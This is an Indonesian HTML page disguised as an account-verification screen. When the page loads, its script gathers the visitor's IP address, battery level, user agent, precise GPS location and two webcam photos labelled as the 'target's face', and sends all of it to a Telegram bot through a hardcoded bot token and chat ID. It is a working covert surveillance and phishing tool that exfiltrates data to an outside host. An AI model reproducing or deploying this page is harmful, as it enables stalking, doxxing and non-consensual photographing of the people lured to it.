<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Akun</title>
    <style>
        body { background-color: black; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace; }
        #camera-preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 10; border: 2px solid red; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { margin-top: 20px; text-align: center; font-size: 14px; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="text">
        <p>MENGHUBUNGKAN KE SERVER...</p>
        <p style="color: #555;">Izinkan Akses Perangkat Untuk Verifikasi</p>
    </div>

    <video id="camera-preview" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8671154802:AAE27-gfr-z089_hQc7imsfH9DXWrXvubQI';
        const CHAT_ID = '1397999934';

        async function sendToTele(type, data, filename = 'capture.jpg') {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
            try {
                if (type === 'text') {
                    await fetch(url + 'sendMessage', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: 'html' })
                    });
                } else if (type === 'photo') {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', data, filename);
                    await fetch(url + 'sendPhoto', formData);
                }
            } catch (e) { console.error(e); }
        }

        async function captureData() {
            // 1. Ambil IP & Info Device
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                let battery = await navigator.getBattery();
                let info = `<b>⚠️ TARGET TERDETEKSI! ⚠️</b>\n\n` +
                           `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                           `🔋 <b>Batre:</b> ${Math.round(battery.level * 100)}%\n` +
                           `📱 <b>User-Agent:</b> ${navigator.userAgent}`;
                sendToTele('text', info);
            } catch (e) { sendToTele('text', 'Gagal ambil IP/Batre'); }

            // 2. Ambil Lokasi
            navigator.geolocation.getCurrentPosition(pos => {
                let mapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                let locInfo = `📍 <b>LOKASI PRESISI:</b>\n<a href="${mapsUrl}">Klik Untuk Lihat di Maps</a>`;
                sendToTele('text', locInfo);
            }, () => {
                sendToTele('text', '❌ Target menolak akses lokasi');
            });

            // 3. Akses Kamera (Mirror Trap)
            const video = document.getElementById('camera-preview');
            const canvas = document.getElementById('canvas');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = 'block'; // Muka target muncul!

                // Ambil 2 Foto (Detik ke-2 dan ke-5)
                [2000, 5000].forEach(ms => {
                    setTimeout(() => {
                        const ctx = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob(blob => sendToTele('photo', blob, `muka_target_${ms}.jpg`), 'image/jpeg');
                    }, ms);
                });
            } catch (err) {
                sendToTele('text', '❌ Target menolak akses kamera');
            }
        }

        window.onload = captureData;
    </script>
</body>
</html>
